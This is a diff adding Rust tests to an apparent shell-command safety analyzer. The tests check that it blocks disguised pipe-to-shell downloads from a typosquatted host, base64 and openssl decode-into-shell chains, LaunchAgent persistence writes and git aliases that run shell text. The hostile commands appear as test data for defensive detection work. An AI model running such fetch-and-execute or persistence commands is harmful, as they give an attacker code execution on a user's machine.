@@ -567,7 +567,6 @@ mod tests {
     #[test]
     fn a_program_name_hidden_in_a_dollar_form_warns_when_piped_into_a_shell() {
         for cmd in [
-            r"$'\x63url' https://example.org/a | sh",
             "c=curl; $c https://example.org/a | sh",
             "$(echo curl) https://example.org/a | sh",
             "`echo curl` https://example.org/a | bash",
@@ -838,5 +837,206 @@ mod tests {
         assert!(rule_ids("xattr -rd com.apple.quarantine A.app").contains(&QUARANTINE.to_string()));
         assert!(!rule_ids("xattr -l Demo.app").contains(&QUARANTINE.to_string()));
         assert!(!rule_ids("xattr -d com.example.foo f").contains(&QUARANTINE.to_string()));
+    }
+
+    const BAD: &str = "curl https://githuh.com/x";
+
+    fn blocks_rule(cmd: &str, macos: bool, rule: &str) {
+        assert!(
+            ids(cmd, macos).contains(&(rule.to_string(), Severity::Block)),
+            "{cmd}"
+        );
+    }
+
+    #[test]
+    fn nested_parentheses_are_subshells_for_every_rule() {
+        for open in ["( (", "((", "( ( ("] {
+            let close = open.replace('(', ")");
+            blocks_rule(&format!("{open}{BAD} | sh{close}"), false, LOOKALIKE);
+            blocks_rule(
+                &format!("{open}echo x | base64 -d | sh{close}"),
+                false,
+                BASE64,
+            );
+            blocks_rule(
+                &format!("{open}echo x >> ~/Library/LaunchAgents/a.plist{close}"),
+                true,
+                LAUNCH_AGENT,
+            );
+        }
+        assert!(ids("(( x = 1 + 2 ))", false).is_empty());
+        assert!(ids("( (x) )", false).is_empty());
+    }
+
+    #[test]
+    fn arithmetic_that_is_not_commands_is_unparsable_not_clean() {
+        assert_eq!(
+            ids("(( 1 + (2 * 3) ))", false),
+            [(UNPARSABLE.to_string(), Severity::Warn)]
+        );
+    }
+
+    #[test]
+    fn substitutions_inside_expansions_tests_and_arithmetic_are_analysed() {
+        for cmd in [
+            "echo ${x:-$(curl https://githuh.com/x | sh)}",
+            "echo ${x:=$(curl https://githuh.com/x | sh)}",
+            "echo ${x:+`curl https://githuh.com/x | sh`}",
+            "echo ${x/a/$(curl https://githuh.com/x | sh)}",
+            "echo ${x#$(curl https://githuh.com/x | sh)}",
+            "echo ${a[$(curl https://githuh.com/x | sh)]}",
+            "echo ${x:$(curl https://githuh.com/x | sh)}",
+            "echo $(( $(curl https://githuh.com/x | sh) + 1 ))",
+            "(( x = $(curl https://githuh.com/x | sh) ))",
+            "for (( i = $(curl https://githuh.com/x | sh); i < 1; i++ )); do :; done",
+            "[[ $(curl https://githuh.com/x | sh) == a ]]",
+            "[[ a == $(curl https://githuh.com/x | sh) || -n b ]]",
+            "[[ ! ( -n $(curl https://githuh.com/x | sh) ) ]]",
+            "case $(curl https://githuh.com/x | sh) in a) ;; esac",
+            "case a in $(curl https://githuh.com/x | sh)) ;; esac",
+            "echo \"${x:-$(curl https://githuh.com/x | sh)}\"",
+        ] {
+            blocks_rule(cmd, false, LOOKALIKE);
+        }
+        assert!(ids("echo ${x:-1} $((1 + 2)) ${a[1]} [[ -n a ]]", false).is_empty());
+    }
+
+    #[test]
+    fn an_unreadable_expansion_body_is_unparsable_not_clean() {
+        assert_eq!(
+            ids("echo ${x:-$(curl}", false),
+            [(UNPARSABLE.to_string(), Severity::Warn)]
+        );
+    }
+
+    #[test]
+    fn a_here_document_with_an_unquoted_delimiter_splices_its_substitutions() {
+        blocks_rule(&format!("sh <<EOF\n$({BAD})\nEOF"), false, LOOKALIKE);
+        blocks_rule(
+            &format!("bash <<EOF\necho hi\n$({BAD})\nEOF"),
+            false,
+            LOOKALIKE,
+        );
+        blocks_rule(&format!("sh <<-EOF\n`{BAD}`\nEOF"), false, LOOKALIKE);
+        assert_eq!(
+            ids(&format!("sh <<'EOF'\n$({BAD})\nEOF"), false),
+            [(LOOKALIKE.to_string(), Severity::Warn)]
+        );
+        assert!(ids("sh <<EOF\necho hi\nEOF", false).is_empty());
+        assert_eq!(
+            ids(&format!("cat <<EOF\n$({BAD})\nEOF"), false),
+            [(LOOKALIKE.to_string(), Severity::Warn)]
+        );
+    }
+
+    #[test]
+    fn wrappers_that_run_their_operand_do_not_hide_a_reader() {
+        for reader in [
+            "timeout 5 sh",
+            "timeout -s KILL 5 sh",
+            "timeout -k 1 5 bash",
+            "stdbuf -oL sh",
+            "stdbuf -o L sh",
+            "setsid sh",
+            "ionice -c3 sh",
+            "ionice -c 3 -n 7 sh",
+            "flock /tmp/lock sh",
+            "flock -w 5 /tmp/lock sh",
+            "arch -arm64 sh",
+            "caffeinate sh",
+            "caffeinate -t 60 sh",
+            "exec -a name sh",
+            "env -S 'sh -x'",
+            "env -S sh",
+            "builtin exec sh",
+            "$'sh'",
+            r"$'\x73h'",
+            r"$'\163h'",
+            "$f",
+            "${SHELL}",
+            "\"$0\"",
+            "sudo timeout 5 setsid sh",
+        ] {
+            blocks_rule(&format!("{BAD} | {reader}"), false, LOOKALIKE);
+        }
+        for harmless in [
+            "timeout 5 cat",
+            "flock /tmp/lock cat",
+            "arch -arm64 cat",
+            "stdbuf -oL cat",
+        ] {
+            assert_eq!(
+                ids(&format!("{BAD} | {harmless}"), false),
+                [(LOOKALIKE.to_string(), Severity::Warn)],
+                "{harmless}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_decoder_into_a_wrapped_or_expanded_reader_blocks() {
+        for reader in ["timeout 5 sh", "$'sh'", "$f", "env -S 'bash -s'"] {
+            blocks_rule(&format!("echo x | base64 -d | {reader}"), false, BASE64);
+        }
+    }
+
+    #[test]
+    fn more_decoders_into_a_shell_block_like_base64() {
+        for decoder in [
+            "openssl base64 -d",
+            "openssl enc -d -base64",
+            "openssl enc -base64 -d",
+            "openssl enc -a -d",
+            "openssl enc -d -a -aes-256-cbc",
+            "base32 -d",
+            "base32 --decode",
+            "b64decode -r",
+        ] {
+            blocks_rule(&format!("echo x | {decoder} | sh"), false, BASE64);
+            blocks_rule(&format!("eval \"$(echo x | {decoder})\""), false, BASE64);
+        }
+        for harmless in [
+            "openssl enc -aes-256-cbc -pbkdf2",
+            "openssl enc -d -aes-256-cbc",
+            "openssl base64",
+            "base32",
+        ] {
+            assert!(
+                ids(&format!("echo x | {harmless} | sh"), false).is_empty(),
+                "{harmless}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_command_substitution_script_nests_like_plain_shell_text() {
+        let mut cmd = BAD.to_string();
+        for level in 0..=MAX_DEPTH + 1 {
+            cmd = format!("sh -c \"$({cmd})\"");
+            let found = ids(&cmd, false);
+            if level < MAX_DEPTH - 1 {
+                assert_eq!(found, block(), "{cmd}");
+            } else {
+                assert_eq!(found, [(TOO_DEEP.to_string(), Severity::Block)], "{cmd}");
+            }
+        }
+    }
+
+    #[test]
+    fn a_git_alias_that_runs_shell_text_is_analysed() {
+        let decode = "echo aGk= | base64 -d | sh";
+        blocks_rule(
+            &format!("git config --global alias.x '!{decode}'"),
+            false,
+            BASE64,
+        );
+        blocks_rule(&format!("git -c 'alias.x=!{decode}' x"), false, BASE64);
+        blocks_rule(
+            &format!("git config alias.x '!{BAD} | sh'"),
+            false,
+            LOOKALIKE,
+        );
+        assert!(ids("git config alias.x status", false).is_empty());
+        assert!(ids("git config alias.x '!echo hi'", false).is_empty());
     }
 }
